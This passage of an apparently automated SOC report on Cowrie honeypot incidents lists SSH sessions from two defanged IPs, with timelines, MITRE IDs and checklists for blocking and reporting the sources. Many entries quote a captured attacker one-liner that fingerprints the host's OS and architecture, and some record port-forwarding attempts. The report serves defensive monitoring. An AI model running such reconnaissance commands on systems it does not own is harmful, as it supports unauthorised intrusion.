| `2026-09-03 11:20:57` | `cowrie.command.input` |
| `2026-09-03 11:20:57` | `cowrie.command.input` |
| `2026-09-03 11:20:57` | `cowrie.command.input` |
| `2026-09-03 11:20:57` | `cowrie.command.input` |
| `2026-09-03 11:20:57` | `cowrie.command.success` |
| `2026-09-03 11:20:57` | `cowrie.command.input` |
| `2026-09-03 11:20:57` | `cowrie.command.input` |
| `2026-09-03 11:20:57` | `cowrie.command.input` |
| `2026-09-03 11:20:57` | `cowrie.command.input` |
| `2026-09-03 11:20:58` | `cowrie.log.closed` |
| `2026-09-03 11:20:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b62674df6305

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 11:22 |
| **Last Seen** | 2026-09-03 11:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:22:06` | `cowrie.session.connect` |
| `2026-09-03 11:22:07` | `cowrie.client.version` |
| `2026-09-03 11:22:07` | `cowrie.client.kex` |
| `2026-09-03 11:22:07` | `cowrie.login.success` |
| `2026-09-03 11:22:08` | `cowrie.session.params` |
| `2026-09-03 11:22:08` | `cowrie.command.input` |
| `2026-09-03 11:22:08` | `cowrie.command.input` |
| `2026-09-03 11:22:08` | `cowrie.command.input` |
| `2026-09-03 11:22:08` | `cowrie.command.input` |
| `2026-09-03 11:22:08` | `cowrie.command.input` |
| `2026-09-03 11:22:08` | `cowrie.command.success` |
| `2026-09-03 11:22:08` | `cowrie.command.input` |
| `2026-09-03 11:22:08` | `cowrie.command.input` |
| `2026-09-03 11:22:08` | `cowrie.command.input` |
| `2026-09-03 11:22:08` | `cowrie.command.input` |
| `2026-09-03 11:22:09` | `cowrie.log.closed` |
| `2026-09-03 11:22:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fafa30256b4

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 11:22 |
| **Last Seen** | 2026-09-03 11:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:22:08` | `cowrie.session.connect` |
| `2026-09-03 11:22:08` | `cowrie.client.version` |
| `2026-09-03 11:22:09` | `cowrie.client.kex` |
| `2026-09-03 11:22:10` | `cowrie.login.success` |
| `2026-09-03 11:22:10` | `cowrie.direct-tcpip.request` |
| `2026-09-03 11:22:11` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 11:22:11` | `cowrie.direct-tcpip.data` |
| `2026-09-03 11:22:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0702d1422913

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 11:23 |
| **Last Seen** | 2026-09-03 11:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:23:22` | `cowrie.session.connect` |
| `2026-09-03 11:23:22` | `cowrie.client.version` |
| `2026-09-03 11:23:23` | `cowrie.client.kex` |
| `2026-09-03 11:23:23` | `cowrie.login.success` |
| `2026-09-03 11:23:24` | `cowrie.session.params` |
| `2026-09-03 11:23:24` | `cowrie.command.input` |
| `2026-09-03 11:23:24` | `cowrie.command.input` |
| `2026-09-03 11:23:24` | `cowrie.command.input` |
| `2026-09-03 11:23:24` | `cowrie.command.input` |
| `2026-09-03 11:23:24` | `cowrie.command.input` |
| `2026-09-03 11:23:24` | `cowrie.command.success` |
| `2026-09-03 11:23:24` | `cowrie.command.input` |
| `2026-09-03 11:23:24` | `cowrie.command.input` |
| `2026-09-03 11:23:24` | `cowrie.command.input` |
| `2026-09-03 11:23:24` | `cowrie.command.input` |
| `2026-09-03 11:23:24` | `cowrie.log.closed` |
| `2026-09-03 11:23:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f4c857c036d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 11:24 |
| **Last Seen** | 2026-09-03 11:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:24:41` | `cowrie.session.connect` |
| `2026-09-03 11:24:41` | `cowrie.client.version` |
| `2026-09-03 11:24:41` | `cowrie.client.kex` |
| `2026-09-03 11:24:41` | `cowrie.login.success` |
| `2026-09-03 11:24:42` | `cowrie.session.params` |
| `2026-09-03 11:24:42` | `cowrie.command.input` |
| `2026-09-03 11:24:42` | `cowrie.command.input` |
| `2026-09-03 11:24:42` | `cowrie.command.input` |
| `2026-09-03 11:24:42` | `cowrie.command.input` |
| `2026-09-03 11:24:42` | `cowrie.command.input` |
| `2026-09-03 11:24:42` | `cowrie.command.success` |
| `2026-09-03 11:24:42` | `cowrie.command.input` |
| `2026-09-03 11:24:42` | `cowrie.command.input` |
| `2026-09-03 11:24:42` | `cowrie.command.input` |
| `2026-09-03 11:24:42` | `cowrie.command.input` |
| `2026-09-03 11:24:42` | `cowrie.log.closed` |
| `2026-09-03 11:24:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d302bc73ad70

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 11:26 |
| **Last Seen** | 2026-09-03 11:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:26:00` | `cowrie.session.connect` |
| `2026-09-03 11:26:00` | `cowrie.client.version` |
| `2026-09-03 11:26:00` | `cowrie.client.kex` |
| `2026-09-03 11:26:01` | `cowrie.login.success` |
| `2026-09-03 11:26:02` | `cowrie.session.params` |
| `2026-09-03 11:26:02` | `cowrie.command.input` |
| `2026-09-03 11:26:02` | `cowrie.command.input` |
| `2026-09-03 11:26:02` | `cowrie.command.input` |
| `2026-09-03 11:26:02` | `cowrie.command.input` |
| `2026-09-03 11:26:02` | `cowrie.command.input` |
| `2026-09-03 11:26:02` | `cowrie.command.success` |
| `2026-09-03 11:26:02` | `cowrie.command.input` |
| `2026-09-03 11:26:02` | `cowrie.command.input` |
| `2026-09-03 11:26:02` | `cowrie.command.input` |
| `2026-09-03 11:26:02` | `cowrie.command.input` |
| `2026-09-03 11:26:02` | `cowrie.log.closed` |
| `2026-09-03 11:26:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc541209d864

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 11:27 |
| **Last Seen** | 2026-09-03 11:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:27:26` | `cowrie.session.connect` |
| `2026-09-03 11:27:26` | `cowrie.client.version` |
| `2026-09-03 11:27:26` | `cowrie.client.kex` |
| `2026-09-03 11:27:27` | `cowrie.login.success` |
| `2026-09-03 11:27:28` | `cowrie.session.params` |
| `2026-09-03 11:27:28` | `cowrie.command.input` |
| `2026-09-03 11:27:28` | `cowrie.command.input` |
| `2026-09-03 11:27:28` | `cowrie.command.input` |
| `2026-09-03 11:27:28` | `cowrie.command.input` |
| `2026-09-03 11:27:28` | `cowrie.command.input` |
| `2026-09-03 11:27:28` | `cowrie.command.success` |
| `2026-09-03 11:27:28` | `cowrie.command.input` |
| `2026-09-03 11:27:28` | `cowrie.command.input` |
| `2026-09-03 11:27:28` | `cowrie.command.input` |
| `2026-09-03 11:27:28` | `cowrie.command.input` |
| `2026-09-03 11:27:29` | `cowrie.log.closed` |
| `2026-09-03 11:27:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36665f2bc17d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 11:28 |
| **Last Seen** | 2026-09-03 11:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:28:38` | `cowrie.session.connect` |
| `2026-09-03 11:28:38` | `cowrie.client.version` |
| `2026-09-03 11:28:38` | `cowrie.client.kex` |
| `2026-09-03 11:28:39` | `cowrie.login.success` |
| `2026-09-03 11:28:40` | `cowrie.session.params` |
| `2026-09-03 11:28:40` | `cowrie.command.input` |
| `2026-09-03 11:28:40` | `cowrie.command.input` |
| `2026-09-03 11:28:40` | `cowrie.command.input` |
| `2026-09-03 11:28:40` | `cowrie.command.input` |
| `2026-09-03 11:28:40` | `cowrie.command.input` |
| `2026-09-03 11:28:40` | `cowrie.command.success` |
| `2026-09-03 11:28:40` | `cowrie.command.input` |
| `2026-09-03 11:28:40` | `cowrie.command.input` |
| `2026-09-03 11:28:40` | `cowrie.command.input` |
| `2026-09-03 11:28:40` | `cowrie.command.input` |
| `2026-09-03 11:28:41` | `cowrie.log.closed` |
| `2026-09-03 11:28:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd04a601d02e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 11:29 |
| **Last Seen** | 2026-09-03 11:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:29:28` | `cowrie.session.connect` |
| `2026-09-03 11:29:28` | `cowrie.client.version` |
| `2026-09-03 11:29:28` | `cowrie.client.kex` |
| `2026-09-03 11:29:29` | `cowrie.login.success` |
| `2026-09-03 11:29:29` | `cowrie.direct-tcpip.request` |
| `2026-09-03 11:29:29` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 11:29:29` | `cowrie.direct-tcpip.data` |
| `2026-09-03 11:29:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5aae02aa922f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 11:29 |
| **Last Seen** | 2026-09-03 11:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:29:42` | `cowrie.session.connect` |
| `2026-09-03 11:29:43` | `cowrie.client.version` |
| `2026-09-03 11:29:43` | `cowrie.client.kex` |
| `2026-09-03 11:29:43` | `cowrie.login.success` |
| `2026-09-03 11:29:45` | `cowrie.session.params` |
| `2026-09-03 11:29:45` | `cowrie.command.input` |
| `2026-09-03 11:29:45` | `cowrie.command.input` |
| `2026-09-03 11:29:45` | `cowrie.command.input` |
| `2026-09-03 11:29:45` | `cowrie.command.input` |
| `2026-09-03 11:29:45` | `cowrie.command.input` |
| `2026-09-03 11:29:45` | `cowrie.command.success` |
| `2026-09-03 11:29:45` | `cowrie.command.input` |
| `2026-09-03 11:29:45` | `cowrie.command.input` |
| `2026-09-03 11:29:45` | `cowrie.command.input` |
| `2026-09-03 11:29:45` | `cowrie.command.input` |
| `2026-09-03 11:29:45` | `cowrie.log.closed` |
| `2026-09-03 11:29:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7ca1111d387

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 11:30 |
| **Last Seen** | 2026-09-03 11:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:30:50` | `cowrie.session.connect` |
| `2026-09-03 11:30:50` | `cowrie.client.version` |
| `2026-09-03 11:30:50` | `cowrie.client.kex` |
| `2026-09-03 11:30:51` | `cowrie.login.success` |
| `2026-09-03 11:30:52` | `cowrie.session.params` |
| `2026-09-03 11:30:52` | `cowrie.command.input` |
| `2026-09-03 11:30:52` | `cowrie.command.input` |
| `2026-09-03 11:30:52` | `cowrie.command.input` |
| `2026-09-03 11:30:52` | `cowrie.command.input` |
| `2026-09-03 11:30:52` | `cowrie.command.input` |
| `2026-09-03 11:30:52` | `cowrie.command.success` |
| `2026-09-03 11:30:52` | `cowrie.command.input` |
| `2026-09-03 11:30:52` | `cowrie.command.input` |
| `2026-09-03 11:30:52` | `cowrie.command.input` |
| `2026-09-03 11:30:52` | `cowrie.command.input` |
| `2026-09-03 11:30:52` | `cowrie.log.closed` |
| `2026-09-03 11:30:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af6a0d96a867

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 11:31 |
| **Last Seen** | 2026-09-03 11:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:31:42` | `cowrie.session.connect` |
| `2026-09-03 11:31:42` | `cowrie.client.version` |
| `2026-09-03 11:31:42` | `cowrie.client.kex` |
| `2026-09-03 11:31:44` | `cowrie.login.success` |
| `2026-09-03 11:31:44` | `cowrie.direct-tcpip.request` |
| `2026-09-03 11:31:44` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 11:31:44` | `cowrie.direct-tcpip.data` |
| `2026-09-03 11:31:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-133c8fbc41ec

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 11:31 |
| **Last Seen** | 2026-09-03 11:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:31:59` | `cowrie.session.connect` |
| `2026-09-03 11:31:59` | `cowrie.client.version` |
| `2026-09-03 11:31:59` | `cowrie.client.kex` |
| `2026-09-03 11:32:00` | `cowrie.login.success` |
| `2026-09-03 11:32:01` | `cowrie.session.params` |
| `2026-09-03 11:32:01` | `cowrie.command.input` |
| `2026-09-03 11:32:01` | `cowrie.command.input` |
| `2026-09-03 11:32:01` | `cowrie.command.input` |
| `2026-09-03 11:32:01` | `cowrie.command.input` |
| `2026-09-03 11:32:01` | `cowrie.command.input` |
| `2026-09-03 11:32:01` | `cowrie.command.success` |
| `2026-09-03 11:32:01` | `cowrie.command.input` |
| `2026-09-03 11:32:01` | `cowrie.command.input` |
| `2026-09-03 11:32:01` | `cowrie.command.input` |
| `2026-09-03 11:32:01` | `cowrie.command.input` |
| `2026-09-03 11:32:01` | `cowrie.log.closed` |
| `2026-09-03 11:32:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51a3f0b23082

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 11:33 |
| **Last Seen** | 2026-09-03 11:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:33:12` | `cowrie.session.connect` |
| `2026-09-03 11:33:12` | `cowrie.client.version` |
| `2026-09-03 11:33:12` | `cowrie.client.kex` |
| `2026-09-03 11:33:13` | `cowrie.login.success` |
| `2026-09-03 11:33:14` | `cowrie.session.params` |
| `2026-09-03 11:33:14` | `cowrie.command.input` |
| `2026-09-03 11:33:14` | `cowrie.command.input` |
| `2026-09-03 11:33:14` | `cowrie.command.input` |
| `2026-09-03 11:33:14` | `cowrie.command.input` |
| `2026-09-03 11:33:14` | `cowrie.command.input` |
| `2026-09-03 11:33:14` | `cowrie.command.success` |
| `2026-09-03 11:33:14` | `cowrie.command.input` |
| `2026-09-03 11:33:14` | `cowrie.command.input` |
| `2026-09-03 11:33:14` | `cowrie.command.input` |
| `2026-09-03 11:33:14` | `cowrie.command.input` |
| `2026-09-03 11:33:14` | `cowrie.log.closed` |
| `2026-09-03 11:33:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2c813d94b9e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 11:34 |
| **Last Seen** | 2026-09-03 11:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
